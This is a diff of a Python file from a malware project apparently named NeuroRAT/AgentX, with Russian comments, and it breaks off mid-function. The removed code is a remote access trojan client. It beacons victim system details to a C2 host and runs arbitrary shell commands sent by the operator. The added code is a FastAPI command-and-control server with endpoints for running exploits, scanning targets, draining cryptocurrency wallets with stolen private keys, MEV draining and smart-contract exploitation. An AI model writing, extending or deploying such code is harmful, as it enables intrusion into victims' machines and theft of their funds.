@@ -1,603 +1,811 @@
 #!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
 """
-NeuroRAT - Основной модуль для управления скрытыми каналами связи
-Запускает и координирует работу всех компонентов системы
+AgentX C2 Server
+================
+
+Главный центр управления и контроля для AgentX/NeuroRAT.
+Обеспечивает интеграцию всех модулей и предоставляет API для админ-панели.
 """
 
 import os
 import sys
-import time
 import json
-import base64
+import time
 import argparse
 import logging
-import signal
-import platform
-import threading
-from typing import Dict, List, Any, Optional
+from fastapi import FastAPI, HTTPException, Depends, Request, status
+from fastapi.responses import JSONResponse
+from fastapi.middleware.cors import CORSMiddleware
+from typing import Dict, List, Optional, Any, Union
+import uvicorn
+import asyncio
+from datetime import datetime
+import uuid
+from web3 import Web3
+import redis
 
-# Добавляем текущую директорию в путь для импорта модулей
-sys.path.append(os.path.dirname(os.path.abspath(__file__)))
+# Настройка путей для корректной работы импортов
+sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
-# Импортируем наши модули
-from channel_manager import ChannelManager
-from modules.crypto import EncryptionManager, CryptoUtils
-from c1_exploit_integration import C1ExploitIntegration
+# Импорт основных модулей
+from src.exploit_manager import ExploitManager
+from src.exploit_engine import ExploitEngine
+from src.host_scanner import HostScanner
+from src.vulnerability_scanner import VulnerabilityScanner
+from src.service_detector import ServiceDetector
+from src.port_scanner import PortScanner
+
+# Импорт специальных модулей
+from src.modules.web3_drainer import Web3Drainer, MEVDrainer
+from src.modules.web3_contract_analyzer import Web3ContractAnalyzer
+from src.autonomous_contract_scanner import AutonomousContractScanner
+from src.modules.stego_tunnel import StegoTunnel
+from src.modules.process_hollowing import ProcessHollowing
+from src.modules.propagator import Propagator
+from src.modules.dropper import Dropper
+
+# Импорт модуля автономного агента
+from src.autonomous_agent import AutonomousAgent
+
+# Импорт Celery app и задач
+from src.celery_app import celery_app, REDIS_URL
+from src.tasks import analyze_contract_task, PROCESSED_CONTRACTS_SET
 
 # Настройка логирования
-def setup_logging(log_level: str = "INFO", log_file: str = None) -> None:
-    """
-    Настраивает систему логирования
-    
-    Args:
-        log_level: Уровень логирования
-        log_file: Файл для записи логов
-    """
-    # Преобразуем текстовый уровень логирования в константу
-    level = getattr(logging, log_level.upper(), logging.INFO)
-    
-    # Настройка форматирования
-    log_format = "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
-    
-    # Настраиваем обработчики логов
-    handlers = [logging.StreamHandler()]
-    
-    if log_file:
-        try:
-            handlers.append(logging.FileHandler(log_file))
-        except Exception as e:
-            print(f"Ошибка при создании файла логов: {e}")
-    
-    # Применяем настройки
-    logging.basicConfig(
-        level=level,
-        format=log_format,
-        handlers=handlers
-    )
+log_format = "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
+logging.basicConfig(
+    level=logging.INFO,
+    format=log_format,
+    handlers=[
+        logging.FileHandler("c2_server.log"),
+        logging.StreamHandler()
+    ]
+)
+logger = logging.getLogger("c2_server")
 
+# Создание FastAPI приложения
+app = FastAPI(
+    title="AgentX C2 Server",
+    description="Command & Control Server for AgentX/NeuroRAT",
+    version="1.0.0"
+)
 
-class NeuroRATClient:
-    """
-    Основной класс клиента NeuroRAT
-    Управляет всеми компонентами системы
-    """
+# Настройка CORS для взаимодействия с админ-панелью
+app.add_middleware(
+    CORSMiddleware,
+    allow_origins=["*"],  # В продакшене заменить на конкретные домены
+    allow_credentials=True,
+    allow_methods=["*"],
+    allow_headers=["*"],
+)
+
+# Глобальные переменные
+agents = {}
+operations = {}
+targets = {}
+crypto_operations = {}
+contract_operations = {}
+block_monitoring_tasks = {}
+producer_redis_client = None
+
+# Инициализация основных компонентов
+exploit_manager = ExploitManager()
+exploit_engine = ExploitEngine()
+host_scanner = HostScanner()
+vulnerability_scanner = VulnerabilityScanner()
+web3_drainer = Web3Drainer()
+web3_contract_analyzer = Web3ContractAnalyzer()
+autonomous_agent = AutonomousAgent()
+autonomous_contract_scanner = AutonomousContractScanner()
+
+# --- Redis Connection for Producer ---
+try:
+    producer_redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True)
+    producer_redis_client.ping()
+    logger.info(f"C2 Server connected to Redis at {REDIS_URL} for producer logic.")
+except redis.exceptions.ConnectionError as e:
+    logger.error(f"C2 Server failed to connect to Redis at {REDIS_URL}: {e}. Producer deduplication disabled.")
+    producer_redis_client = None
+
+# --- Block Monitoring Producer Logic ---
+async def _monitor_blocks_producer(chain: str, network: str, rpc_url: str, start_block: Union[str, int] = 'latest', poll_interval: int = 15):
+    """Monitors new blocks, finds created contracts, and submits analysis tasks."""
+    monitor_id = f"{chain}:{network}"
+    logger.info(f"Starting block monitor producer for {monitor_id} using RPC: {rpc_url}")
     
-    def __init__(
-        self,
-        config_file: str = None,
-        c2_host: str = "neurorat.com",
-        c2_ip: str = None,
-        encryption_method: str = "aes",
-        encryption_key: str = None,
-        primary_channel: str = "https"
-    ):
-        """
-        Инициализация клиента
-        
-        Args:
-            config_file: Путь к файлу конфигурации
-            c2_host: Хост C2-сервера
-            c2_ip: IP-адрес C2-сервера (для ICMP)
-            encryption_method: Метод шифрования
-            encryption_key: Ключ шифрования (если None, генерируется автоматически)
-            primary_channel: Основной канал связи
-        """
-        self.logger = logging.getLogger("neuroclient")
-        
-        # Загружаем конфигурацию
-        self.config = self._load_config(config_file) if config_file else {}
-        
-        # Применяем параметры из конфигурации или используем значения по умолчанию
-        self.c2_host = c2_host or self.config.get("c2_host", "neurorat.com")
-        self.c2_ip = c2_ip or self.config.get("c2_ip")
-        self.encryption_method = encryption_method or self.config.get("encryption_method", "aes")
-        self.encryption_key = self._load_encryption_key(encryption_key)
-        self.primary_channel = primary_channel or self.config.get("primary_channel", "https")
-        
-        # Параметры каналов из конфигурации
-        self.channels_config = self.config.get("channels", {})
-        
-        # Компоненты системы
-        self.channel_manager = None
-        # Интеграция модуля автоматизации эксплойтов
-        self.exploit_integration = C1ExploitIntegration(safe_mode=True)
-        
-        # Статус работы
-        self.is_running = False
-        self.main_thread = None
-        
-        # Информация о системе
-        self.system_info = self._collect_system_info()
-        
-        # Очередь команд для выполнения
-        self.command_queue = []
-        self.command_queue_lock = threading.RLock()
-        
-        # Обработчик сигналов завершения
-        signal.signal(signal.SIGINT, self._signal_handler)
-        if platform.system() != "Windows":
-            signal.signal(signal.SIGTERM, self._signal_handler)
-        
-        self.logger.info("NeuroRAT клиент инициализирован")
-    
-    def _load_config(self, config_file: str) -> Dict[str, Any]:
-        """
-        Загружает конфигурацию из файла
-        
-        Args:
-            config_file: Путь к JSON-файлу с конфигурацией
-            
-        Returns:
-            Dict: Загруженная конфигурация
-        """
-        try:
-            with open(config_file, 'r') as f:
-                config = json.load(f)
-                self.logger.info(f"Конфигурация загружена из {config_file}")
-                return config
-        except Exception as e:
-            self.logger.error(f"Ошибка загрузки конфигурации: {e}")
-            return {}
-    
-    def _load_encryption_key(self, key_str: str = None) -> bytes:
-        """
-        Загружает или генерирует ключ шифрования
-        
-        Args:
-            key_str: Строка ключа в base64 (если None, генерируется новый ключ)
-            
-        Returns:
-            bytes: Ключ шифрования
-        """
-        if key_str:
-            try:
-                return base64.b64decode(key_str)
-            except:
-                self.logger.error("Некорректный формат ключа шифрования")
-        
-        # Пытаемся получить ключ из конфигурации
-        config_key = self.config.get("encryption_key")
-        if config_key:
-            try:
-                return base64.b64decode(config_key)
-            except:
-                self.logger.error("Некорректный формат ключа в конфигурации")
-        
-        # Генерируем новый ключ
-        key = os.urandom(32)  # 256-bit key
-        self.logger.info("Сгенерирован новый ключ шифрования")
-        return key
-    
-    def _collect_system_info(self) -> Dict[str, Any]:
-        """
-        Собирает информацию о системе
-        
-        Returns:
-            Dict: Информация о системе
-        """
-        import socket
-        import getpass
-        import uuid
-        
-        system_info = {
-            "hostname": socket.gethostname(),
-            "platform": platform.system(),
-            "platform_version": platform.version(),
-            "architecture": platform.machine(),
-            "processor": platform.processor(),
-            "username": getpass.getuser(),
-            "mac_address": ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
-                                   for elements in range(0, 8*6, 8)][::-1]),
-            "ip_addresses": {}
-        }
-        
-        # Получаем IP-адреса
-        try:
-            hostname = socket.gethostname()
-            system_info["ip_addresses"]["local"] = socket.gethostbyname(hostname)
-            
-            # Пытаемся получить внешний IP
-            try:
-                import urllib.request
-                external_ip = urllib.request.urlopen('https://api.ipify.org').read().decode('utf8')
-                system_info["ip_addresses"]["external"] = external_ip
-            except:
-                pass
-            
-        except Exception as e:
-            self.logger.error(f"Ошибка при получении IP-адресов: {e}")
-        
-        # Проверяем права администратора
-        if platform.system() == "Windows":
-            import ctypes
-            system_info["is_admin"] = ctypes.windll.shell32.IsUserAnAdmin() != 0
-        else:
-            system_info["is_admin"] = os.geteuid() == 0
-        
-        return system_info
-    
-    def _signal_handler(self, sig, frame) -> None:
-        """Обработчик сигналов для корректного завершения"""
-        self.logger.info(f"Получен сигнал завершения {sig}")
-        self.stop()
-    
-    def _data_callback(self, data: bytes) -> None:
-        """
-        Обработчик данных, полученных от канала связи
-        
-        Args:
-            data: Полученные данные
-        """
-        try:
-            # Пытаемся декодировать JSON-команду
-            command_data = json.loads(data.decode('utf-8'))
-            
-            # Добавляем в очередь команд
-            with self.command_queue_lock:
-                self.command_queue.append(command_data)
-                self.logger.info(f"Получена команда: {command_data.get('command', 'UNKNOWN')}")
-        
-        except json.JSONDecodeError:
-            self.logger.warning("Получены некорректные данные (не JSON)")
-        except Exception as e:
-            self.logger.error(f"Ошибка обработки данных: {e}")
-    
-    def _process_commands(self) -> None:
-        """Обрабатывает команды из очереди"""
-        with self.command_queue_lock:
-            if not self.command_queue:
-                return
-            
-            # Извлекаем команду из очереди
-            command_data = self.command_queue.pop(0)
-            
-            # Обрабатываем команду
-            command = command_data.get("command")
-            parameters = command_data.get("parameters", {})
-            command_id = command_data.get("id", "unknown")
-            
-            self.logger.info(f"Обработка команды {command} (ID: {command_id})")
-            
-            # Выполняем команду
-            if command == "system_info":
-                # Отправляем информацию о системе
-                self._send_command_result(command_id, {"status": "success", "system_info": self.system_info})
-            
-            elif command == "execute_shell":
-                # Выполняем shell-команду
-                result = self._execute_shell_command(parameters.get("shell_command"), 
-                                                  parameters.get("timeout", 60))
-                self._send_command_result(command_id, result)
-            
-            elif command == "update_config":
-                # Обновляем конфигурацию
-                self._update_config(parameters)
-                self._send_command_result(command_id, {"status": "success", "message": "Конфигурация обновлена"})
-            
-            elif command == "restart":
-                # Перезапускаем клиент
-                self._send_command_result(command_id, {"status": "success", "message": "Перезапуск клиента..."})
-                self.restart()
-            
-            elif command == "shutdown":
-                # Останавливаем клиент
-                self._send_command_result(command_id, {"status": "success", "message": "Завершение работы..."})
-                self.stop()
-            
-            elif command == "scan_network":
-                result = self.exploit_integration.scan_network(
-                    target_range=parameters.get("target_range"),
-                    concurrency=parameters.get("concurrency", 5)
-                )
-                self._send_command_result(command_id, result)
-            
-            elif command == "exploit_vulnerabilities":
-                result = self.exploit_integration.exploit_vulnerabilities(
-                    target_hosts=parameters.get("target_hosts")
-                )
-                self._send_command_result(command_id, result)
-            
-            elif command == "generate_report":
-                result = self.exploit_integration.generate_report(
-                    include_details=parameters.get("include_details", True)
-                )
-                self._send_command_result(command_id, result)
-            
-            elif command == "set_safe_mode":
-                result = self.exploit_integration.set_safe_mode(
-                    safe_mode=parameters.get("safe_mode", True)
-                )
-                self._send_command_result(command_id, result)
-            
-            elif command == "get_vulnerability_details":
-                result = self.exploit_integration.get_vulnerability_details(
-                    vuln_id=parameters.get("vuln_id")
-                )
-                self._send_command_result(command_id, result)
-            
-            elif command == "get_exploit_details":
-                result = self.exploit_integration.get_exploit_details(
-                    exploit_id=parameters.get("exploit_id")
-                )
-                self._send_command_result(command_id, result)
-            
-            else:
-                # Неизвестная команда
-                self._send_command_result(command_id, {
-                    "status": "error",
-                    "message": f"Неизвестная команда: {command}"
-                })
-    
-    def _execute_shell_command(self, command: str, timeout: int = 60) -> Dict[str, Any]:
-        """
-        Выполняет shell-команду
-        
-        Args:
-            command: Команда для выполнения
-            timeout: Таймаут в секундах
-            
-        Returns:
-            Dict: Результат выполнения команды
-        """
-        import subprocess
-        
-        if not command:
-            return {"status": "error", "message": "Не указана команда"}
-        
-        try:
-            process = subprocess.Popen(
-                command,
-                shell=True,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                universal_newlines=True
-            )
-            
-            stdout, stderr = process.communicate(timeout=timeout)
-            
-            return {
-                "status": "success" if process.returncode == 0 else "error",
-                "stdout": stdout,
-                "stderr": stderr,
-                "exit_code": process.returncode
-            }
-        
-        except subprocess.TimeoutExpired:
-            process.kill()
-            return {
-                "status": "error",
-                "message": f"Превышено время выполнения команды ({timeout}с)"
-            }
-        except Exception as e:
-            return {
-                "status": "error",
-                "message": str(e)
-            }
-    
-    def _update_config(self, new_config: Dict[str, Any]) -> None:
-        """
-        Обновляет конфигурацию клиента
-        
-        Args:
-            new_config: Новые параметры конфигурации
-        """
-        # Обновляем основные параметры
-        if "c2_host" in new_config:
-            self.c2_host = new_config["c2_host"]
-        
-        if "c2_ip" in new_config:
-            self.c2_ip = new_config["c2_ip"]
-        
-        if "primary_channel" in new_config:
-            self.primary_channel = new_config["primary_channel"]
-        
-        if "encryption_method" in new_config:
-            self.encryption_method = new_config["encryption_method"]
-        
-        if "encryption_key" in new_config:
-            try:
-                self.encryption_key = base64.b64decode(new_config["encryption_key"])
-            except:
-                self.logger.error("Некорректный формат ключа шифрования в новой конфигурации")
-        
-        # Обновляем конфигурацию каналов
-        if "channels" in new_config:
-            self.channels_config.update(new_config["channels"])
-        
-        # Обновляем полную конфигурацию
-        self.config.update(new_config)
-        
-        self.logger.info("Конфигурация обновлена")
-    
-    def _send_command_result(self, command_id: str, result: Dict[str, Any]) -> None:
-        """
-        Отправляет результат выполнения команды
-        
-        Args:
-            command_id: Идентификатор команды
-            result: Результат выполнения
-        """
-        response = {
-            "type": "command_result",
-            "id": command_id,
-            "timestamp": time.time(),
-            "result": result
-        }
-        
-        try:
-            # Сериализуем в JSON и отправляем
-            json_data = json.dumps(response).encode('utf-8')
-            
-            if self.channel_manager:
-                self.channel_manager.send(json_data)
-                self.logger.info(f"Отправлен результат команды {command_id}")
-            else:
-                self.logger.error("Channel Manager не инициализирован")
-        
-        except Exception as e:
-            self.logger.error(f"Ошибка отправки результата команды: {e}")
-    
-    def _main_loop(self) -> None:
-        """Основной цикл работы клиента"""
-        try:
-            # Время последней отправки пинга
-            last_ping_time = 0
-            
-            while self.is_running:
-                current_time = time.time()
-                
-                # Обрабатываем команды из очереди
-                self._process_commands()
-                
-                # Отправляем пинг каждые 5 минут
-                if current_time - last_ping_time >= 300:  # 5 минут
-                    self._send_ping()
-                    last_ping_time = current_time
-                
-                # Спим некоторое время
-                time.sleep(1)
-        
-        except Exception as e:
-            self.logger.error(f"Ошибка в основном цикле: {e}")
-            self.stop()
-    
-    def _send_ping(self) -> None:
-        """Отправляет пинг на C2-сервер"""
-        ping_data = {
-            "type": "ping",
-            "timestamp": time.time(),
-            "system_info": self.system_info
-        }
-        
-        try:
-            # Сериализуем в JSON и отправляем
-            json_data = json.dumps(ping_data).encode('utf-8')
-            
-            if self.channel_manager:
-                self.channel_manager.send(json_data)
-                self.logger.debug("Отправлен пинг")
-            else:
-                self.logger.error("Channel Manager не инициализирован")
-        
-        except Exception as e:
-            self.logger.error(f"Ошибка отправки пинга: {e}")
-    
-    def restart(self) -> None:
-        """Перезапускает клиент"""
-        self.logger.info("Перезапуск клиента")
-        self.stop()
-        time.sleep(1)
-        self.start()
-    
-    def start(self) -> bool:
-        """
-        Запускает клиент
-        
-        Returns:
-            bool: True если запуск успешен
-        """
-        if self.is_running:
-            return False
-        
-        try:
-            # Инициализируем менеджер каналов
-            self.channel_manager = ChannelManager(
-                c2_host=self.c2_host,
-                c2_ip=self.c2_ip,
-                channels_config=self.channels_config,
-                primary_channel=self.primary_channel,
-                data_callback=self._data_callback,
-                encryption_method=self.encryption_method
-            )
-            
-            # Устанавливаем ключ шифрования
-            if self.encryption_key:
-                self.channel_manager.encryption_manager.set_key(
-                    self.encryption_method, 
-                    self.encryption_key
-                )
-            
-            # Запускаем менеджер каналов
-            if not self.channel_manager.start():
-                self.logger.error("Не удалось запустить менеджер каналов")
-                return False
-            
-            # Запускаем основной цикл
-            self.is_running = True
-            self.main_thread = threading.Thread(
-                target=self._main_loop,
-                daemon=True,
-                name="NeuroRAT-Main"
-            )
-            self.main_thread.start()
-            
-            # Отправляем начальный пинг с информацией о системе
-            self._send_ping()
-            
-            self.logger.info("NeuroRAT клиент запущен")
-            return True
-        
-        except Exception as e:
-            self.logger.error(f"Ошибка запуска клиента: {e}")
-            return False
-    
-    def stop(self) -> None:
-        """Останавливает клиент"""
-        if not self.is_running:
+    try:
+        w3 = Web3(Web3.HTTPProvider(rpc_url))
+        if not w3.is_connected():
+            logger.error(f"Failed to connect to RPC endpoint {rpc_url} for {monitor_id}")
             return
+            
+        processed_block_hashes = set()
+        last_processed_block_number = -1
         
-        self.is_running = False
-        
-        # Останавливаем менеджер каналов
-        if self.channel_manager:
-            try:
-                self.channel_manager.stop()
-            except Exception as e:
-                self.logger.error(f"Ошибка остановки менеджера каналов: {e}")
-        
-        self.logger.info("NeuroRAT клиент остановлен")
+        # Initialize last processed block number
+        try:
+             if start_block == 'latest':
+                  last_processed_block_number = w3.eth.block_number
+                  logger.info(f"[{monitor_id}] Starting monitor from latest block: {last_processed_block_number}")
+             else:
+                  last_processed_block_number = int(start_block) -1 # Start from the block before
+                  logger.info(f"[{monitor_id}] Starting monitor from block: {start_block}")
+        except Exception as e:
+             logger.error(f"[{monitor_id}] Error getting initial block number: {e}. Using -1.")
 
+        while True:
+            try:
+                latest_block_number = w3.eth.block_number
+                
+                if latest_block_number > last_processed_block_number:
+                    # Process blocks from last_processed + 1 up to latest_block_number
+                    for block_num in range(last_processed_block_number + 1, latest_block_number + 1):
+                        logger.debug(f"[{monitor_id}] Processing block {block_num}")
+                        block = w3.eth.get_block(block_num, full_transactions=True)
+                        
+                        if not block or block.hash.hex() in processed_block_hashes:
+                            continue # Skip if block not found or already processed (reorg?)
+                            
+                        processed_block_hashes.add(block.hash.hex())
+                        if len(processed_block_hashes) > 100: # Keep cache size limited
+                             processed_block_hashes.pop() 
+                             
+                        for tx in block.transactions:
+                            # Check for contract creation (to address is None)
+                            if tx['to'] is None and tx.get('contractAddress'):
+                                contract_address = tx['contractAddress']
+                                contract_id = f"{chain}:{network}:{contract_address.lower()}"
+                                logger.info(f"[{monitor_id}] New contract detected: {contract_address} in block {block_num}")
+                                
+                                # Check Redis if already submitted (optional but recommended)
+                                should_submit = True
+                                if producer_redis_client:
+                                    try:
+                                        # Use a different set for *submitted* tasks vs *processed* tasks?
+                                        # Using PROCESSED_CONTRACTS_SET assumes tasks process reasonably fast.
+                                        if producer_redis_client.sismember(PROCESSED_CONTRACTS_SET, contract_id):
+                                            logger.debug(f"[{monitor_id}] Contract {contract_id} already in processed set. Skipping task submission.")
+                                            should_submit = False
+                                    except Exception as redis_err:
+                                        logger.error(f"[{monitor_id}] Redis error checking processed set for {contract_id}: {redis_err}")
+                                
+                                if should_submit:
+                                    # Submit analysis task to Celery queue
+                                    # Note: We are not fetching source code here.
+                                    analyze_contract_task.delay(contract_address, chain, network, source_code=None)
+                                    logger.info(f"[{monitor_id}] Submitted analysis task for {contract_address}")
+                                    # Optionally add to a 'submitted' set in Redis here
+                                    
+                        last_processed_block_number = block_num
+                else:
+                    # No new blocks
+                    pass
+                    
+                # Wait before checking again
+                await asyncio.sleep(poll_interval)
+                
+            except asyncio.CancelledError:
+                logger.info(f"Block monitor producer {monitor_id} cancelled.")
+                break # Exit the loop cleanly
+            except Exception as e:
+                logger.error(f"[{monitor_id}] Error in monitoring loop: {e}", exc_info=True)
+                # Wait longer after an error before retrying
+                await asyncio.sleep(poll_interval * 4)
+                # Re-establish connection if needed
+                try:
+                     if not w3.is_connected():
+                          w3 = Web3(Web3.HTTPProvider(rpc_url))
+                          logger.info(f"[{monitor_id}] Reconnected to RPC.")
+                except Exception as recon_e:
+                     logger.error(f"[{monitor_id}] Failed to re-establish RPC connection: {recon_e}")
+                     await asyncio.sleep(poll_interval * 10) # Wait even longer
+
+    except Exception as outer_e:
+         logger.critical(f"[{monitor_id}] Unrecoverable error setting up monitor: {outer_e}", exc_info=True)
+    finally:
+         logger.info(f"Stopping block monitor producer for {monitor_id}")
+
+@app.get("/")
+async def root():
+    return {"status": "online", "name": "AgentX C2", "version": "1.0.0"}
+
+@app.get("/api/status")
+async def get_status():
+    return {
+        "status": "operational",
+        "agents": len(agents),
+        "operations": len(operations),
+        "targets": len(targets),
+        "crypto_operations": len(crypto_operations),
+        "contract_operations": len(contract_operations),
+        "server_time": datetime.now().isoformat()
+    }
+
+@app.get("/api/agents")
+async def get_agents():
+    return {"agents": list(agents.values())}
+
+@app.post("/api/agents/register")
+async def register_agent(agent_data: Dict[str, Any]):
+    agent_id = str(uuid.uuid4())
+    agent_data["id"] = agent_id
+    agent_data["registered_at"] = datetime.now().isoformat()
+    agent_data["last_seen"] = datetime.now().isoformat()
+    agents[agent_id] = agent_data
+    logger.info(f"New agent registered: {agent_id}")
+    return {"agent_id": agent_id, "status": "registered"}
+
+@app.get("/api/exploits")
+async def get_exploits():
+    available_exploits = exploit_manager.list_exploits()
+    return {"exploits": available_exploits}
+
+@app.post("/api/scan/start")
+async def start_scan(scan_config: Dict[str, Any]):
+    operation_id = str(uuid.uuid4())
+    target = scan_config.get("target")
+    scan_type = scan_config.get("type", "full")
+    
+    operations[operation_id] = {
+        "id": operation_id,
+        "type": "scan",
+        "target": target,
+        "status": "running",
+        "start_time": datetime.now().isoformat(),
+        "details": scan_config
+    }
+    
+    # Запуск сканирования в отдельном потоке
+    asyncio.create_task(run_scan(operation_id, target, scan_type, scan_config))
+    
+    return {"operation_id": operation_id, "status": "started"}
+
+async def run_scan(operation_id, target, scan_type, config):
+    try:
+        if scan_type == "host":
+            results = host_scanner.scan(target)
+        elif scan_type == "vulnerability":
+            results = vulnerability_scanner.scan(target)
+        elif scan_type == "port":
+            port_scanner = PortScanner()
+            results = port_scanner.scan(target)
+        elif scan_type == "full":
+            # Полное сканирование включает все типы
+            results = {
+                "host": host_scanner.scan(target),
+                "vulnerability": vulnerability_scanner.scan(target),
+                "ports": PortScanner().scan(target)
+            }
+        else:
+            results = {"error": "Unknown scan type"}
+        
+        operations[operation_id]["status"] = "completed"
+        operations[operation_id]["end_time"] = datetime.now().isoformat()
+        operations[operation_id]["results"] = results
+        
+    except Exception as e:
+        logger.error(f"Scan failed: {str(e)}")
+        operations[operation_id]["status"] = "failed"
+        operations[operation_id]["error"] = str(e)
+        operations[operation_id]["end_time"] = datetime.now().isoformat()
+
+@app.post("/api/crypto/drain")
+async def start_crypto_drain(drain_config: Dict[str, Any]):
+    operation_id = str(uuid.uuid4())
+    
+    crypto_operations[operation_id] = {
+        "id": operation_id,
+        "type": "crypto_drain",
+        "status": "running",
+        "start_time": datetime.now().isoformat(),
+        "details": drain_config
+    }
+    
+    # Запуск дрейнера в отдельном потоке
+    asyncio.create_task(run_crypto_drain(operation_id, drain_config))
+    
+    return {"operation_id": operation_id, "status": "started"}
+
+async def run_crypto_drain(operation_id, config):
+    try:
+        chain = config.get("chain", "ethereum")
+        network = config.get("network", "mainnet")
+        
+        if "private_key" in config:
+            # Дрейн одного аккаунта
+            result = web3_drainer.drain_account(
+                chain=chain,
+                network=network,
+                private_key=config["private_key"],
+                receiver_address=config.get("receiver_address")
+            )
+            
+        elif "private_keys_file" in config:
+            # Импорт и дрейн списка ключей
+            web3_drainer.import_private_keys_from_file(config["private_keys_file"])
+            result = web3_drainer.drain_all_victims(chain, network)
+            
+        else:
+            result = {"error": "No private keys provided"}
+        
+        crypto_operations[operation_id]["status"] = "completed"
+        crypto_operations[operation_id]["end_time"] = datetime.now().isoformat()
+        crypto_operations[operation_id]["results"] = result
+        
+    except Exception as e:
+        logger.error(f"Crypto drain failed: {str(e)}")
+        crypto_operations[operation_id]["status"] = "failed"
+        crypto_operations[operation_id]["error"] = str(e)
+        crypto_operations[operation_id]["end_time"] = datetime.now().isoformat()
+
+@app.post("/api/mev/monitor")
+async def start_mev_monitoring(mev_config: Dict[str, Any]):
+    operation_id = str(uuid.uuid4())
+    
+    crypto_operations[operation_id] = {
+        "id": operation_id,
+        "type": "mev_monitoring",
+        "status": "running",
+        "start_time": datetime.now().isoformat(),
+        "details": mev_config
+    }
+    
+    # Запуск MEV-мониторинга в отдельном потоке
+    asyncio.create_task(run_mev_monitoring(operation_id, mev_config))
+    
+    return {"operation_id": operation_id, "status": "started"}
+
+async def run_mev_monitoring(operation_id, config):
+    try:
+        mev_drainer = MEVDrainer()
+        
+        if "private_keys" in config:
+            for key in config["private_keys"]:
+                mev_drainer.add_private_key(key)
+        
+        if "profit_threshold" in config:
+            mev_drainer.set_profit_threshold(float(config["profit_threshold"]))
+        
+        chain = config.get("chain", "ethereum")
+        network = config.get("network", "mainnet")
+        
+        # Не добавляем await, т.к. monitor_mempool блокирует поток
+        # В реальном приложении стоит использовать отдельный процесс/тред
+        asyncio.create_task(run_mev_monitoring_task(mev_drainer, chain, network))
+        
+        crypto_operations[operation_id]["status"] = "monitoring"
+        
+    except Exception as e:
+        logger.error(f"MEV monitoring failed: {str(e)}")
+        crypto_operations[operation_id]["status"] = "failed"
+        crypto_operations[operation_id]["error"] = str(e)
+        crypto_operations[operation_id]["end_time"] = datetime.now().isoformat()
+
+async def run_mev_monitoring_task(mev_drainer, chain, network):
+    """Отдельная задача для запуска мониторинга MEV"""
+    try:
+        mev_drainer.monitor_mempool(chain, network)
+    except Exception as e:
+        logger.error(f"MEV monitoring task failed: {str(e)}")
+
+@app.post("/api/exploit/run")
+async def run_exploit(exploit_config: Dict[str, Any]):
+    operation_id = str(uuid.uuid4())
+    
+    operations[operation_id] = {
+        "id": operation_id,
+        "type": "exploit",
+        "status": "running",
+        "start_time": datetime.now().isoformat(),
+        "details": exploit_config
+    }
+    
+    # Запуск эксплойта в отдельном потоке
+    asyncio.create_task(run_exploit_task(operation_id, exploit_config))
+    
+    return {"operation_id": operation_id, "status": "started"}
+
+async def run_exploit_task(operation_id, config):
+    try:
+        target = config.get("target")
+        exploit_name = config.get("exploit")
+        exploit_params = config.get("params", {})
+        
+        result = exploit_engine.run_exploit(exploit_name, target, exploit_params)
+        
+        operations[operation_id]["status"] = "completed"
+        operations[operation_id]["end_time"] = datetime.now().isoformat()
+        operations[operation_id]["results"] = result
+        
+    except Exception as e:
+        logger.error(f"Exploit failed: {str(e)}")
+        operations[operation_id]["status"] = "failed"
+        operations[operation_id]["error"] = str(e)
+        operations[operation_id]["end_time"] = datetime.now().isoformat()
+
+@app.post("/api/agent/autonomous")
+async def activate_autonomous_agent(config: Dict[str, Any]):
+    operation_id = str(uuid.uuid4())
+    
+    operations[operation_id] = {
+        "id": operation_id,
+        "type": "autonomous_agent",
+        "status": "running",
+        "start_time": datetime.now().isoformat(),
+        "details": config
+    }
+    
+    # Запуск автономного агента в отдельном потоке
+    asyncio.create_task(run_autonomous_agent(operation_id, config))
+    
+    return {"operation_id": operation_id, "status": "started"}
+
+async def run_autonomous_agent(operation_id, config):
+    try:
+        network_range = config.get("network_range")
+        scan_duration = config.get("scan_duration", 3600)  # 1 час по умолчанию
+        
+        # Тут должен быть код запуска автономного агента
+        
+        operations[operation_id]["status"] = "running"
+        
+    except Exception as e:
+        logger.error(f"Autonomous agent failed: {str(e)}")
+        operations[operation_id]["status"] = "failed"
+        operations[operation_id]["error"] = str(e)
+        operations[operation_id]["end_time"] = datetime.now().isoformat()
+
+# Новые эндпоинты для работы со смарт-контрактами
+
+@app.post("/api/contracts/analyze")
+async def analyze_contract(analyze_config: Dict[str, Any]):
+    """Анализирует смарт-контракт на наличие уязвимостей"""
+    operation_id = str(uuid.uuid4())
+    
+    contract_operations[operation_id] = {
+        "id": operation_id,
+        "type": "contract_analyze",
+        "status": "running",
+        "start_time": datetime.now().isoformat(),
+        "details": analyze_config
+    }
+    
+    # Запуск анализа в отдельном потоке
+    asyncio.create_task(run_contract_analyze(operation_id, analyze_config))
+    
+    return {"operation_id": operation_id, "status": "started"}
+
+async def run_contract_analyze(operation_id, config):
+    try:
+        chain = config.get("chain", "ethereum")
+        network = config.get("network", "mainnet")
+        contract_address = config.get("contract_address")
+        
+        if not contract_address:
+            raise ValueError("Contract address is required")
+        
+        result = web3_contract_analyzer.analyze_contract(
+            chain=chain,
+            network=network,
+            contract_address=contract_address
+        )
+        
+        contract_operations[operation_id]["status"] = "completed"
+        contract_operations[operation_id]["end_time"] = datetime.now().isoformat()
+        contract_operations[operation_id]["results"] = result
+        
+    except Exception as e:
+        logger.error(f"Contract analysis failed: {str(e)}")
+        contract_operations[operation_id]["status"] = "failed"
+        contract_operations[operation_id]["error"] = str(e)
+        contract_operations[operation_id]["end_time"] = datetime.now().isoformat()
+
+@app.post("/api/contracts/exploit")
+async def exploit_contract(exploit_config: Dict[str, Any]):
+    """Эксплуатирует уязвимость в смарт-контракте"""
+    operation_id = str(uuid.uuid4())
+    
+    contract_operations[operation_id] = {
+        "id": operation_id,
+        "type": "contract_exploit",
+        "status": "running",
+        "start_time": datetime.now().isoformat(),
+        "details": exploit_config
+    }
+    
+    # Запуск эксплуатации в отдельном потоке
+    asyncio.create_task(run_contract_exploit(operation_id, exploit_config))
+    
+    return {"operation_id": operation_id, "status": "started"}
+
+async def run_contract_exploit(operation_id, config):
+    try:
+        chain = config.get("chain", "ethereum")
+        network = config.get("network", "mainnet")
+        contract_address = config.get("contract_address")
